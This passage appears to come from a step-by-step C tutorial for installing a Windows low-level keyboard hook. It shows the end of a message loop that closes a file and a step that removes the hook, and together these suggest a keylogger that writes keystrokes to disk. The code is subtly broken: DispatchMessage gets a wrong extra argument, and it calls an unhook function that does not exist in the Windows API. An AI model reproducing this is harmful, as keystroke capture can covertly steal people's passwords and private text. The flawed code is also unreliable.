                   fclose(file);
               }
           }
       }
       TranslateMessage(&msg);
       DispatchMessage(hwnd, &msg);
   }
   ```

8. **Uninstall the Keyboard Hook**: When the program exits, remove the hook.
   ```c
   if (UnhookKeyboard(hKeyboardHook, WH_KEYBOARD_LL)) {
       printf("Successfully unloaded keyboard hook.\n");
   } else {
       printf("Failed to unload keyboard hook.\n");
   }
   ```

